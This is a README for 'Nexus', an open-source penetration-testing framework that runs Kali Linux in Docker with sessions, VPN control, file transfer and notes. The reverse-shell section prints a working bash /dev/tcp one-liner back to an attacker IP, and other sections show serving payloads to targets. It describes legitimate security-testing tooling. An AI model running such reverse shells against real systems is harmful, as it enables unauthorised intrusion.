# Nexus

**Nexus** is an open source ethical hacking framework designed for Windows, Mac, and Linux. It spins up an isolated **Kali Linux environment inside Docker**, accessible from a unified terminal with session management, file transfers, background tasks, and built-in note-taking.

---

## 💡 Concept & Architecture

| Concept | Description |
|---|---|
| **Workspace** | Isolated environment = 1 dedicated Kali Linux container. Fully sandboxed. |
| **Session** | Interactive bash terminal inside the workspace. Multiple sessions supported. |
| **Background session** | Long-running command (nmap, listener...) launched in the background, output captured in a log. |
| **Shared folder** | `workspaces/<name>/` on your machine ↔ `/workspace` inside the container. Native bidirectional transfer. |
| **Persistence** | Notes, sessions, and history are saved as JSON between each Nexus run. |

---

## 🔧 Requirements

- **[Docker Desktop](https://www.docker.com/products/docker-desktop/)** installed and running
- **Python 3.10+**

---

## 📦 Installation

### Windows
```powershell
git clone https://github.com/Program132/Nexus.git
cd Nexus
py -m venv env
.\env\Scripts\python.exe -m pip install -r requirements.txt
```

### Linux / Mac
```bash
git clone https://github.com/Program132/Nexus.git
cd Nexus
python3 -m venv env
source env/bin/activate
python3 -m pip install -r requirements.txt
```

---

## 🚀 Getting Started

```powershell
# Windows — create/open a new workspace
.\env\Scripts\python.exe nexus.py -n myWorkspace

# With host network mode (same IP as host)
.\env\Scripts\python.exe nexus.py -n myWorkspace -H
```

```bash
# Linux / Mac — create/open a new workspace
source env/bin/activate
python3 nexus.py -n myWorkspace

# With host network mode
python3 nexus.py -n myWorkspace -H
```

> ⏳ **First launch:** Building the Docker image (Kali Linux + all tools) takes **5 to 10 minutes** depending on your connection. All subsequent launches, even for new workspaces, are instant.

---

## 🌐 Networking

By default, Nexus containers use Docker's **bridge** network — isolated from the host with NAT.

Use the `-H` / `--host-network` flag to enable **host network mode**: the container shares the host's full network stack.

```
nexus.py -n myWorkspace -H
```

| Mode | IP | Use case |
|---|---|---|
| Bridge (default) | Own container IP | Isolated pentesting |
| Host (`-H`) | Same as host | Same-IP scanning |

> **Linux** — Works perfectly.
>
> **Windows / Mac** — Docker Desktop runs containers inside a Linux VM (WSL2/HyperV). Host mode shares the VM's network stack, not Windows itself.

> ⚠️ Changing network mode requires **recreating the container**. If the workspace already exists, delete it first: `docker rm -f nexus_workspace_<name>`

---

## 📖 Commands

### Sessions

| Command | Description |
|---|---|
| `nexus session new [name]` | Create an interactive Kali terminal and jump into it |
| `nexus session open <id>` | Re-enter an existing session |
| `nexus session list` | List all sessions (interactive + background) |
| `nexus session del <id>` | Remove a session from the list |
| `nexus session bg <id> <cmd>` | Run `<cmd>` in the background, output captured in a log |
| `nexus session logs <id>` | Display the log of a background session |

**Example — background nmap scan:**
```
[myWorkspace] [/workspace] (nexus) > nexus session bg scan1 nmap -sV 192.168.1.1
[SUCCESS] Background session 'scan1' started: nmap -sV 192.168.1.1

[myWorkspace] [/workspace] (nexus) > nexus session logs scan1
[INFO] --- Logs: scan1 ---
Starting Nmap 7.93 ...
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9
80/tcp  open  http     Apache 2.4.54
```

**Visual prompt cues:**
```
[myWorkspace] [/workspace] (nexus) >      ← Nexus menu      (cyan)
[myWorkspace] [/workspace] (session) >    ← Bash session    (orange)
```

Type `exit` or `Ctrl+D` to return to the Nexus menu from a session.

---

### 🌍 VPN Management

Nexus handles OpenVPN connections directly, bridging your host machine and the Kali workspace. It supports standard OpenVPN clients on Linux/Mac, and seamlessly controls **OpenVPN Connect** GUI or CLI on Windows for a silent, background experience.

| Command | Description |
|---|---|
| `nexus ovpn start <file.ovpn>` | Connect to a VPN on both your host OS and the Kali VM |
| `nexus ovpn status` | Show the VPN status and the `tun0` IP allocated |
| `nexus ovpn stop` | Terminate all VPN processes seamlessly |

---

### 🕸️ Reverse Shells & Payloads

Quickly format payload codes injecting your current VPN IP on the fly.

| Command | Description |
|---|---|
| `nexus rev <type> <port>` | Generate a ready-to-use reverse shell payload |

Supported types: `bash`, `nc`, `python`, `php`, `powershell`, `perl`, `awk`, `socat`, `java`, `ruby`.

**Example:**
```
[myWorkspace] [/workspace] (nexus) > nexus rev bash 4444
[SUCCESS] --- Payload BASH ---
bash -c 'bash -i >& /dev/tcp/10.10.15.40/4444 0>&1'
[INFO] Don't forget to listen! ->  nexus session new 'nc -lvnp 4444'
```

---

### 🌐 Built-in HTTP Server

Quickly serve explosive payloads or scripts directly to your target.

| Command | Description |
|---|---|
| `nexus server start [port]` | Start a Python HTTP server in the background (Default: 8000) |
| `nexus server stop` | Terminate the HTTP server |
| `nexus server upload <file>` | Automatically upload a local Windows file and gives you the `wget` command for the target |

---

### 📦 Tools Store (Fetch)

Don't waste time searching for common scripts on Github during an assessment. Nexus comes with a built-in tools store to instantly download them directly into your `/workspace`.

| Command | Description |
|---|---|
| `nexus fetch list` | Show all available tools in the store |
| `nexus fetch <name>` | Download a tool into your workspace (shared with Windows) |
| `nexus fetch add <name> <url>` | Add a custom tool URL to your global store |

**Example:**
```
[myWorkspace] [/workspace] (nexus) > nexus fetch linpeas
[INFO] Fetching linpeas from https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh...
[SUCCESS] Tool 'linpeas' downloaded to /workspace/linpeas.sh (shared with Windows)!
[INFO] -> Use 'nexus server upload linpeas.sh' to serve it to the target.
```

---

### File Transfer

| Context | Command | Effect |
|---|---|---|
| Nexus menu | `upload D:\report.txt` | Copy from Windows → `/workspace/report.txt` |
| Nexus menu | `download report.txt` | Copy `/workspace/report.txt` → Windows |
| Bash session | `upload /etc/passwd` | Copy from container → `/workspace/passwd` (visible on Windows) |
| Bash session | `download passwd` | Show the Windows path of the file |

---

### Notes

| Command | Description |
|---|---|
| `nexus note "text"` | Add a timestamped note to the workspace |
| `nexus notes` | Display all notes for the workspace |

```
[myWorkspace] [/workspace] (nexus) > nexus note "target: 192.168.1.1 — SSH open port 22"
[SUCCESS] Note saved.

[myWorkspace] [/workspace] (nexus) > nexus notes
  [1] 2026-03-11 23:24:00  target: 192.168.1.1 — SSH open port 22
```

---

### Environment Variables

Environment variables are stored in the workspace and **automatically injected into every session** on open.

| Command | Description |
|---|---|
| `nexus env set <key> <value>` | Set an env var for all sessions |
| `nexus env del <key>` | Remove an env var |
| `nexus env list` | Show all env vars |

```
[myWorkspace] [/workspace] (nexus) > nexus env set TARGET 10.10.11.45
[SUCCESS] Env var set: TARGET=10.10.11.45

[myWorkspace] [/workspace] (nexus) > nexus env set LHOST 10.10.14.5
[SUCCESS] Env var set: LHOST=10.10.14.5

[myWorkspace] [/workspace] (nexus) > nexus session new
┌─ Session 'abc123' ─ prompt is orange inside ─ 'exit' or Ctrl+D to return
[myWorkspace] [/workspace] (session) > echo $TARGET
10.10.11.45
[myWorkspace] [/workspace] (session) > nmap $TARGET
Starting Nmap 7.93 ...
```

Variables persist across runs — saved to `.nexus_state.json` alongside notes and sessions.

---

### Miscellaneous


| Command | Description |
|---|---|
| `nexus history` | Show the command history for the workspace |
| `help` | Show the full help |
| `exit` / `quit` | Exit Nexus |

---

## 🛠️ Built-in Tools

The Docker image ships with the following tools, ready to use:

| Category | Tools |
|---|---|
| **Reconnaissance** | `nmap`, `dnsutils`, `tcpdump` |
| **Web** | `dirb`, `ffuf`, `gobuster`, `feroxbuster`, `curl`, `wget` |
| **Exploitation** | `metasploit` (msfconsole), `impacket-scripts` |
| **Post-exploitation** | `netcat` (nc), `smbclient` |
| **Passwords** | `hashcat`, `john` (John the Ripper) |
| **Network** | `openvpn`, `net-tools`, `iproute2` |
| **SMB / AD** | `nxc` (NetExec), `smbclient` |
| **Dev** | `python3`, `pip`, `git` |
| **Database** | `mysql` |

---

## ➕ Adding Your Own Tools

Edit [`docker/Dockerfile`](docker/Dockerfile) to add tools:

```dockerfile
RUN apt-get update && apt-get install -y my-tool
```

Then **rebuild the image** by removing the old one:

```powershell
docker rmi nexus-env:latest
.\env\Scripts\python.exe nexus.py -n myWorkspace
```

Nexus will automatically rebuild the image on the next launch.

---

## 📁 Project Structure

```
Nexus/
├── nexus.py               # Main entry point
├── Logger.py              # Colored logging system
├── requirements.txt
├── docker/
│   └── Dockerfile         # Kali Linux image with pentest tools
├── core/
│   ├── shell.py           # Main REPL loop
│   ├── commands.py        # All command handlers
│   ├── docker_manager.py  # Docker interface (containers, sessions, logs)
│   └── workspace.py       # Workspace state + JSON persistence
└── workspaces/
    └── <name>/
        ├── .nexus_state.json   # Auto-save (notes, sessions, history)
        └── ...                 # Your files shared with the container
```

---

## 🔒 Security & Isolation

Nexus containers run with the Linux capabilities required by offensive tools:

| Capability | Purpose |
|---|---|
| `NET_RAW`, `NET_ADMIN` | Raw sockets for nmap, tcpdump, etc. |
| `SYS_PTRACE` | Debugging with strace / gdb |
| `seccomp=unconfined` | Unrestricted syscalls for pentest tools |

Each workspace is **fully isolated** from others and from the host system, except for the shared `/workspace` folder.

---

## 📄 License

Nexus is an open source project. For legal and ethical use only.